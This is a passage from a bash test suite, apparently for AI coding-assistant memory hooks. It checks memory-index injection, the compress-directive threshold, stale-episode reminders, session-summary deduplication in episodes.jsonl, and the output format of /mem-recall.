inject_hook_threshold_at_boundary_emits_directive() {
  # Verifies that exactly 50 index entries (at the threshold) DOES emit the
  # /memory-compress directive — threshold fires at >= 50.
  # Steps:
  #   1. Create a matching project MEMORY.md with exactly 50 index lines
  #   2. Run the hook and capture stdout
  #   3. Assert all 50 lines present AND the "⚠" directive line appears
  local name="inject-hook/threshold-50-emits-directive" dir cwd payload output body status i directive_line
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  {
    printf '# title\n'
    for i in $(seq 1 50); do
      printf -- '- memory index line %03d\n' "$i"
    done
  } > "$dir/memory50.md"
  write_inject_memory "$dir" "$cwd" "$(cat "$dir/memory50.md")"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  body="$(printf '%s\n' "$output" | sed '1d;$d')"
  directive_line="$(printf '%s\n' "$body" | grep '^⚠' || true)"
  if [[ "$status" == "0" \
      && "$body" == *"memory index line 050"* \
      && -n "$directive_line" \
      && "$directive_line" == *"run /memory-compress"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s directive=%q\n' "$name" "$status" "$directive_line"
  fi
  rm -rf "$dir"
}

inject_hook_default_home_fallback() {
  # Verifies that when CLAUDE_CONFIG_DIR is unset, the hook falls back to $HOME/.claude.
  # Steps:
  #   1. Create a temp dir used as a sandboxed HOME; write MEMORY.md under
  #      <tmp_home>/.claude/projects/<encoded>/memory/ with a uniquely-named fake cwd
  #   2. Run hook-inject-memory.sh with HOME overridden to the temp dir and
  #      CLAUDE_CONFIG_DIR stripped (env -u), so the fallback resolves to tmp_home
  #   3. Assert exit 0 and the index line appears in stdout
  #   4. Clean up the temp HOME — never touches real $HOME
  local name="inject-hook/default-home-fallback" cwd encoded tmp_home project_dir payload output status
  should_run "$name" || return 0
  tmp_home="$(mktemp -d)"
  cwd="/tmp/inject-hook-home-fallback-test-$$"
  encoded="$(inject_encoded_path "$cwd")"
  project_dir="${tmp_home}/.claude/projects/${encoded}/memory"
  mkdir -p "$project_dir"
  printf '# test\n- home fallback line\n' > "$project_dir/MEMORY.md"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | HOME="$tmp_home" env -u CLAUDE_CONFIG_DIR "$MEM_HOOK" 2>/dev/null)
  status=$?
  rm -rf "$tmp_home"
  if [[ "$status" == "0" && "$output" == *"home fallback line"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
}

inject_hook_happy_path
inject_hook_parent_fallback
inject_hook_no_memory_found
inject_hook_empty_index
inject_hook_malformed_payload
inject_hook_empty_stdin
inject_hook_missing_cwd
inject_hook_non_string_cwd
inject_hook_threshold_below_emits_no_directive
inject_hook_threshold_at_boundary_emits_directive
inject_hook_threshold_shows_directive
inject_hook_default_home_fallback

# Episode reminder tests (CC-019 inject hook extension)

write_episodes_jsonl() {
  local config_dir="$1" cwd="$2" content="$3" encoded
  encoded="$(inject_encoded_path "$cwd")"
  mkdir -p "$config_dir/projects/$encoded/memory"
  printf '%s' "$content" > "$config_dir/projects/$encoded/memory/episodes.jsonl"
}

inject_hook_episode_no_file() {
  # Verifies that when episodes.jsonl does not exist, no reminder is appended.
  # Steps:
  #   1. Create project MEMORY.md but no episodes.jsonl
  #   2. Run inject hook and capture output
  #   3. Assert output contains index lines but no episode reminder
  local name="inject-hook/episode-no-file"
  should_run "$name" || return 0
  local dir cwd payload output status
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && "$output" == *"alpha"* && "$output" != *"💡"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_episode_fresh() {
  # Verifies that a recent episode (< 24h) does not trigger a reminder.
  # Steps:
  #   1. Create project MEMORY.md and episodes.jsonl with a now-dated entry
  #   2. Run inject hook
  #   3. Assert no 💡 reminder in output
  local name="inject-hook/episode-fresh"
  should_run "$name" || return 0
  local dir cwd payload output status now_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  now_iso="$(date -u +%Y-%m-%dT%H:%M:%S+00:00)"
  write_episodes_jsonl "$dir" "$cwd" "{\"date\":\"$now_iso\",\"cwd\":\"$cwd\",\"session_id\":\"s1\",\"summary\":\"\"}"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && "$output" == *"alpha"* && "$output" != *"💡"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_episode_stale_no_summary() {
  # Verifies stale episode (> 24h) with no summary triggers /mem-log reminder.
  # Steps:
  #   1. Create episodes.jsonl with an entry dated 48h ago, empty summary
  #   2. Run inject hook
  #   3. Assert output contains 💡 ... /mem-log reminder
  local name="inject-hook/episode-stale-no-summary"
  should_run "$name" || return 0
  local dir cwd payload output status old_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  old_iso="$(jq -rn 'now - 172800 | strftime("%Y-%m-%dT%H:%M:%S") | . + "+00:00"')"
  write_episodes_jsonl "$dir" "$cwd" "{\"date\":\"$old_iso\",\"cwd\":\"$cwd\",\"session_id\":\"s1\",\"summary\":\"\"}"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && "$output" == *"/mem-log"* && "$output" == *"💡"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_episode_stale_has_summary() {
  # Verifies stale episode (> 24h) with a summary triggers "Last episode" reminder.
  # Steps:
  #   1. Create episodes.jsonl with a 48h-old entry that has a non-empty summary
  #   2. Run inject hook
  #   3. Assert output contains 💡 Last episode reminder (not /mem-log reminder)
  local name="inject-hook/episode-stale-has-summary"
  should_run "$name" || return 0
  local dir cwd payload output status old_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  old_iso="$(jq -rn 'now - 172800 | strftime("%Y-%m-%dT%H:%M:%S") | . + "+00:00"')"
  write_episodes_jsonl "$dir" "$cwd" "{\"date\":\"$old_iso\",\"cwd\":\"$cwd\",\"session_id\":\"s1\",\"summary\":\"Previous session summary.\"}"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && "$output" == *"Last episode"* && "$output" == *"💡"* && "$output" != *"/mem-log to record"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_episode_no_file
inject_hook_episode_fresh
inject_hook_episode_stale_no_summary
inject_hook_episode_stale_has_summary

inject_hook_episode_stale_fractional_iso() {
  # Verifies stale episode (> 24h) with a Python-style fractional ISO timestamp
  # (e.g. 2020-01-01T00:00:00.123456+00:00) is parsed correctly and triggers /mem-log.
  # Steps:
  #   1. Create episodes.jsonl with entry dated 2020-01-01 using fractional-offset format
  #   2. Run inject hook with CLAUDE_CONFIG_DIR set
  #   3. Assert exit 0, output contains 💡 and /mem-log reminder
  local name="inject-hook/episode-stale-fractional-iso"
  should_run "$name" || return 0
  local dir cwd payload output status
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  write_episodes_jsonl "$dir" "$cwd" "{\"date\":\"2020-01-01T00:00:00.123456+00:00\",\"cwd\":\"$cwd\",\"session_id\":\"s1\",\"summary\":\"\"}"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  rm -rf "$dir"
  if [[ "$status" == "0" && "$output" == *"/mem-log"* && "$output" == *"💡"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
}

inject_hook_episode_fresh_fractional_iso() {
  # Verifies fresh episode (< 24h) with a Python-style fractional ISO timestamp
  # is parsed correctly and does NOT trigger a stale reminder.
  # Steps:
  #   1. Create episodes.jsonl with entry dated now using fractional-offset format
  #   2. Run inject hook with CLAUDE_CONFIG_DIR set
  #   3. Assert exit 0, output contains memory content but NOT 💡 reminder
  local name="inject-hook/episode-fresh-fractional-iso"
  should_run "$name" || return 0
  local dir cwd payload output status now_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  now_iso="$(date -u +%Y-%m-%dT%H:%M:%S).123456+00:00"
  write_episodes_jsonl "$dir" "$cwd" "{\"date\":\"$now_iso\",\"cwd\":\"$cwd\",\"session_id\":\"s1\",\"summary\":\"\"}"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  rm -rf "$dir"
  if [[ "$status" == "0" && "$output" == *"alpha"* && "$output" != *"💡"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
}
inject_hook_episode_stale_fractional_iso
inject_hook_episode_fresh_fractional_iso

inject_hook_routing_dir_isolation() {
  # Verifies inject hook uses project memory (CLAUDE_CONFIG_DIR) and ignores
  # CLAUDE_ROUTING_LOG_DIR, which is installer/migrator-only behavior.
  # Steps:
  #   1. Create project memory dir with MEMORY.md containing "- alpha"
  #   2. Create a separate empty routing dir
  #   3. Run hook with both CLAUDE_CONFIG_DIR and CLAUDE_ROUTING_LOG_DIR set
  #   4. Assert exit 0 and output contains "alpha" (project memory, not routing dir)
  local name="inject-hook/routing-dir-isolation"
  should_run "$name" || return 0
  local dir routing_dir cwd payload output status
  dir="$(mktemp -d)"
  routing_dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" CLAUDE_ROUTING_LOG_DIR="$routing_dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  rm -rf "$dir" "$routing_dir"
  if [[ "$status" == "0" && "$output" == *"alpha"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
}
inject_hook_routing_dir_isolation

# =============================================================================
# hook-session-summary
# =============================================================================

echo
$LIST || echo "== hook-session-summary =="

session_hook_happy_path() {
  # Verifies a new session_id appends a metadata entry to episodes.jsonl.
  # Steps:
  #   1. Create a project memory dir with no episodes.jsonl
  #   2. Run session hook with a valid payload (cwd + session_id)
  #   3. Assert exit 0 and episodes.jsonl has one line with correct session_id
  local name="session-hook/happy-path"
  should_run "$name" || return 0
  local dir cwd payload status episodes entry
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"sess-001\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  episodes="$dir/projects/$(inject_encoded_path "$cwd")/memory/episodes.jsonl"
  entry="$(cat "$episodes" 2>/dev/null || true)"
  if [[ "$status" == "0" && "$entry" == *'"session_id":"sess-001"'* && "$entry" == *'"summary":""'* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s entry=%q\n' "$name" "$status" "$entry"
  fi
  rm -rf "$dir"
}

session_hook_duplicate_no_summary() {
  # Verifies same session_id with empty summary is NOT appended again.
  # Steps:
  #   1. Pre-populate episodes.jsonl with a skeleton entry for session-abc
  #   2. Run session hook with the same session_id
  #   3. Assert episodes.jsonl still has exactly 1 line (no duplicate)
  local name="session-hook/duplicate-no-summary"
  should_run "$name" || return 0
  local dir cwd payload status line_count encoded
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  encoded="$(inject_encoded_path "$cwd")"
  printf '{"date":"2026-01-01T00:00:00+00:00","cwd":"%s","session_id":"session-abc","summary":""}\n' "$cwd" \
    > "$dir/projects/$encoded/memory/episodes.jsonl"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"session-abc\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$dir/projects/$encoded/memory/episodes.jsonl")
  if [[ "$status" == "0" && "$line_count" -eq 1 ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s\n' "$name" "$status" "$line_count"
  fi
  rm -rf "$dir"
}

session_hook_duplicate_has_summary() {
  # Verifies same session_id with non-empty summary is NOT appended again.
  # Steps:
  #   1. Pre-populate episodes.jsonl with a full entry for session-abc
  #   2. Run session hook with the same session_id
  #   3. Assert episodes.jsonl still has exactly 1 line
  local name="session-hook/duplicate-has-summary"
  should_run "$name" || return 0
  local dir cwd payload status line_count encoded
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  encoded="$(inject_encoded_path "$cwd")"
  printf '{"date":"2026-01-01T00:00:00+00:00","cwd":"%s","session_id":"session-abc","summary":"Done work."}\n' "$cwd" \
    > "$dir/projects/$encoded/memory/episodes.jsonl"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"session-abc\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$dir/projects/$encoded/memory/episodes.jsonl")
  if [[ "$status" == "0" && "$line_count" -eq 1 ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s\n' "$name" "$status" "$line_count"
  fi
  rm -rf "$dir"
}

session_hook_new_session_appends() {
  # Verifies a new session_id appends to an existing episodes.jsonl.
  # Steps:
  #   1. Pre-populate episodes.jsonl with one completed entry
  #   2. Run hook with a DIFFERENT session_id
  #   3. Assert episodes.jsonl now has 2 lines
  local name="session-hook/new-session-appends"
  should_run "$name" || return 0
  local dir cwd payload status line_count encoded
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  encoded="$(inject_encoded_path "$cwd")"
  printf '{"date":"2026-01-01T00:00:00+00:00","cwd":"%s","session_id":"old-sess","summary":"Old work."}\n' "$cwd" \
    > "$dir/projects/$encoded/memory/episodes.jsonl"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"new-sess\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$dir/projects/$encoded/memory/episodes.jsonl")
  if [[ "$status" == "0" && "$line_count" -eq 2 ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s\n' "$name" "$status" "$line_count"
  fi
  rm -rf "$dir"
}

session_hook_no_memory_dir() {
  # Verifies exit 0 with no output when no matching project memory dir exists.
  # Steps:
  #   1. Create a config dir with no projects
  #   2. Run hook with a cwd that has no ancestor memory dir
  #   3. Assert exit 0 and no episodes.jsonl created
  local name="session-hook/no-memory-dir"
  should_run "$name" || return 0
  local dir cwd payload output status
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"s1\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

session_hook_malformed_payload() {
  # Verifies exit 0 with no output when payload is not valid JSON.
  # Steps:
  #   1. Send non-JSON string to session hook stdin
  #   2. Assert exit 0 and empty stdout
  local name="session-hook/malformed-payload"
  should_run "$name" || return 0
  local output status
  output=$(printf 'not json' | "$SESSION_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
}

session_hook_empty_stdin() {
  # Verifies the session hook exits 0 silently when stdin is empty.
  # Steps:
  #   1. Pipe an empty string to the session hook
  #   2. Assert exit 0 and no output produced
  local name="session-hook/empty-stdin"
  should_run "$name" || return 0
  local output status
  output=$(printf '' | "$SESSION_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
}

session_hook_missing_session_id() {
  # Verifies the Stop hook exits 0 and writes nothing when session_id is absent.
  # Without a stable session_id the hook cannot deduplicate, so it must skip.
  # Steps:
  #   1. Create project memory dir with no episodes.jsonl
  #   2. Run hook with payload that omits the session_id key entirely
  #   3. Assert exit 0 and no episodes.jsonl created
  local name="session-hook/missing-session-id"
  should_run "$name" || return 0
  local dir cwd episodes status
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  episodes="$dir/projects/$(inject_encoded_path "$cwd")/memory/episodes.jsonl"
  printf '%s' "{\"cwd\":\"$cwd\"}" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -f "$episodes" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    local lines=0; [[ -f "$episodes" ]] && lines=$(wc -l < "$episodes")
    printf '  FAIL  %s — exit=%s episodes_exists=%s lines=%s\n' "$name" "$status" "$([[ -f "$episodes" ]] && echo yes || echo no)" "$lines"
  fi
  rm -rf "$dir"
}

session_hook_non_string_session_id() {
  # Verifies the Stop hook exits 0 and writes nothing when session_id is a
  # non-string JSON value (e.g., integer). Non-string ids are normalized to ""
  # and must be treated as absent (no write).
  # Steps:
  #   1. Create project memory dir with no episodes.jsonl
  #   2. Run hook with payload where session_id is an integer (42)
  #   3. Assert exit 0 and no episodes.jsonl created
  local name="session-hook/non-string-session-id"
  should_run "$name" || return 0
  local dir cwd episodes status
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  episodes="$dir/projects/$(inject_encoded_path "$cwd")/memory/episodes.jsonl"
  printf '%s' "{\"cwd\":\"$cwd\",\"session_id\":42}" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -f "$episodes" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    local lines=0; [[ -f "$episodes" ]] && lines=$(wc -l < "$episodes")
    printf '  FAIL  %s — exit=%s episodes_exists=%s lines=%s\n' "$name" "$status" "$([[ -f "$episodes" ]] && echo yes || echo no)" "$lines"
  fi
  rm -rf "$dir"
}

session_hook_happy_path
session_hook_duplicate_no_summary
session_hook_duplicate_has_summary
session_hook_new_session_appends
session_hook_no_memory_dir
session_hook_malformed_payload
session_hook_empty_stdin
session_hook_missing_session_id
session_hook_non_string_session_id

session_hook_routing_dir_isolation() {
  # Verifies session hook writes episodes.jsonl to project memory (CLAUDE_CONFIG_DIR)
  # and NOT to CLAUDE_ROUTING_LOG_DIR, which is installer/migrator-only behavior.
  # Steps:
  #   1. Create project memory dir
  #   2. Create a separate empty routing dir
  #   3. Run hook with both CLAUDE_CONFIG_DIR and CLAUDE_ROUTING_LOG_DIR set
  #   4. Assert exit 0, episodes.jsonl created in project memory dir, NOT in routing dir
  local name="session-hook/routing-dir-isolation"
  should_run "$name" || return 0
  local dir routing_dir cwd payload status project_has_ep routing_has_ep
  dir="$(mktemp -d)"
  routing_dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"isolation-test\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" CLAUDE_ROUTING_LOG_DIR="$routing_dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  project_has_ep=false; routing_has_ep=false
  [[ -f "$dir/projects/$(inject_encoded_path "$cwd")/memory/episodes.jsonl" ]] && project_has_ep=true
  [[ -f "$routing_dir/episodes.jsonl" ]] && routing_has_ep=true
  rm -rf "$dir" "$routing_dir"
  if [[ "$status" == "0" && "$project_has_ep" == "true" && "$routing_has_ep" == "false" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s project_ep=%s routing_ep=%s\n' "$name" "$status" "$project_has_ep" "$routing_has_ep"
  fi
}
session_hook_routing_dir_isolation

# =============================================================================
# command validators — /mem-recall injection format
# =============================================================================
$LIST || echo "== mem-recall format validator =="

mem_recall_format_validator() {
  # Validates the /mem-recall output format contract using a Python replica of the
  # command logic. Exercises the data contract that /mem-recall depends on.
  # Steps:
  #   1. Write 3 episodes.jsonl entries: 2 with summaries, 1 skeleton (empty summary)
  #   2. Run the Python reader logic (last-N non-empty-summary filter)
  #   3. Assert output contains both summaries, the header/footer markers,
  #      and does NOT include the skeleton entry
  local name="mem-recall/format-validator"
  should_run "$name" || return 0
  local dir episodes result
  dir="$(mktemp -d)"
  episodes="$dir/episodes.jsonl"

  # Write 3 entries: 2 with summary, 1 skeleton (should be skipped)
  printf '{"date":"2026-01-01T00:00:00+00:00","cwd":"/proj","session_id":"s1","summary":"First session: fixed bug X."}\n' >> "$episodes"
  printf '{"date":"2026-01-02T00:00:00+00:00","cwd":"/proj","session_id":"s2","summary":""}\n' >> "$episodes"
  printf '{"date":"2026-01-03T00:00:00+00:00","cwd":"/proj","session_id":"s3","summary":"Third session: added feature Y."}\n' >> "$episodes"

  result=$(jq -Rrs '
    [split("\n")[] | select(length > 0) | try fromjson catch null | select(. != null and ((.summary // "") | length) > 0)]
    | .[-5:] as $recent
    | "== Recent episodes (last \($recent | length)) ==\n\n"
      + ($recent | map("[\(.date)] \(.cwd)\n\(.summary)\n\n") | join(""))
      + "== end episodes =="
  ' "$episodes" 2>/dev/null)

  local ok=true
  [[ "$result" == *"== Recent episodes (last 2) =="* ]] || ok=false
  [[ "$result" == *"First session: fixed bug X."* ]] || ok=false
  [[ "$result" == *"Third session: added feature Y."* ]] || ok=false
  [[ "$result" == *"== end episodes =="* ]] || ok=false
  # Skeleton entry must NOT appear in output
  [[ "$result" != *'"summary":""'* ]] || ok=false

  rm -rf "$dir"

  if $ok; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — output=%q\n' "$name" "$result"
  fi
}

mem_recall_format_validator

# =============================================================================
# cross-command: /mem-log (session_id="") + Stop hook interaction
# =============================================================================
$LIST || echo "== cross-command: mem-log + session-stop =="

session_stop_skips_after_recent_memlog_empty_session_id() {
  # Verifies Stop hook does NOT append a skeleton when /mem-log already wrote
  # a full summary entry with session_id="" for the same cwd within the 4-hour
  # session window. The recent /mem-log entry represents the current session.
  # Steps:
  #   1. Create project memory dir and write a /mem-log entry (1h ago, session_id="")
  #      with a non-empty summary for the workspace cwd
  #   2. Run Stop hook with a real session_id for the same cwd
  #   3. Assert exit 0 and episodes.jsonl still has exactly 1 line (no skeleton appended)
  local name="cross-cmd/stop-skips-after-recent-memlog-empty-session-id"
  should_run "$name" || return 0
  local dir cwd episodes payload status line_count recent_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  episodes="$dir/projects/$(inject_encoded_path "$cwd")/memory/episodes.jsonl"
  # Recent /mem-log entry (1 hour ago) with empty session_id
  recent_iso=$(jq -rn 'now - 3600 | strftime("%Y-%m-%dT%H:%M:%S") | . + "+00:00"')
  printf '{"date":"%s","cwd":"%s","session_id":"","summary":"Fixed the widget bug."}\n' \
    "$recent_iso" "$cwd" > "$episodes"

  payload="{\"cwd\":\"$cwd\",\"session_id\":\"real-session-id-123\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$episodes" 2>/dev/null || echo 0)
  rm -rf "$dir"

  if [[ "$status" == "0" && "$line_count" == "1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s (expected 1)\n' "$name" "$status" "$line_count"
  fi
}

session_stop_appends_after_old_memlog_empty_session_id() {
  # Verifies Stop hook DOES append a new skeleton when the last session_id=""
  # entry is older than the 4-hour session window. An old /mem-log entry from
  # a previous day must not permanently suppress future Stop-hook recording.
  # Steps:
  #   1. Create project memory dir and write a /mem-log entry (10h ago, session_id="")
  #      with a non-empty summary — outside the 4-hour session window
  #   2. Run Stop hook with a new real session_id for the same cwd
  #   3. Assert exit 0 and episodes.jsonl now has 2 lines (new skeleton appended)
  local name="cross-cmd/stop-appends-after-old-memlog-empty-session-id"
  should_run "$name" || return 0
  local dir cwd episodes payload status line_count old_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  episodes="$dir/projects/$(inject_encoded_path "$cwd")/memory/episodes.jsonl"
  # Old /mem-log entry (10 hours ago) with empty session_id
